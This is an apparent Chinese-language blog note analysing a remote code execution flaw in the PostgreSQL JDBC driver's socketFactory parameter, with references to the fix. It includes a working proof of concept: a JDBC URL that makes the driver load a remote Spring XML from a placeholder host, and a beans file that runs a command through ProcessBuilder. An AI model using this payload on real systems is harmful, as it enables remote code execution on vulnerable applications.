# Postgresql

看到网上都放了exp了这里就简简单单分析一下

## 简单分析

在org.postgresql.util.ObjectFactory#instantiate可以初始化任意类，这里找到了org.springframework.context.support.ClassPathXmlApplicationContext，这个函数本来就是初始化spring配置的，这里可以解析远程xml配置文件实现RCE



参数作用，来自官网

```java
socketFactory = String

The provided value is a class name to use as the SocketFactory when establishing a socket connection. This may be used to create unix sockets instead of normal sockets. The class name specified by socketFactory must extend javax.net.SocketFactory and be available to the driver's classloader. This class must have a zero-argument constructor, a single-argument constructor taking a String argument, or a single-argument constructor taking a Properties argument. The Properties object will contain all the connection parameters. The String argument will have the value of the socketFactoryArg connection parameter.

socketFactoryArg (deprecated) = String

This value is an optional argument to the constructor of the socket factory class provided above.
```



## POC

```java
      DriverManager.getConnection("jdbc:postgresql://node1/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://xxx/exp.xml");
```

```xml
<beans xmlns="http://www.springframework.org/schema/beans"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:schemaLocation="http://www.springframework.org/schema/beans
http://www.springframework.org/schema/beans/spring-beans.xsd">
<bean id="pb" class="java.lang.ProcessBuilder">
  <constructor-arg>
    <list value-type="java.lang.String" >
       <value>open</value>
       <value>-na</value>
       <value>Calculator</value>
    </list>
  </constructor-arg>
  <property name="y4tacker" value="#{pb.start()}"/>
</bean>
</beans>
```

## 似乎还可以读文件

参考CVE-2019-12086，反正都是构造函数相关

## 参考链接

放两个链接即可很简单的

https://zhuanlan.zhihu.com/p/465057399

https://github.com/pgjdbc/pgjdbc/commit/f4d0ed69c0b3aae8531d83d6af4c57f22312c813

https://jdbc.postgresql.org/documentation/head/connect.html#connection-parameters

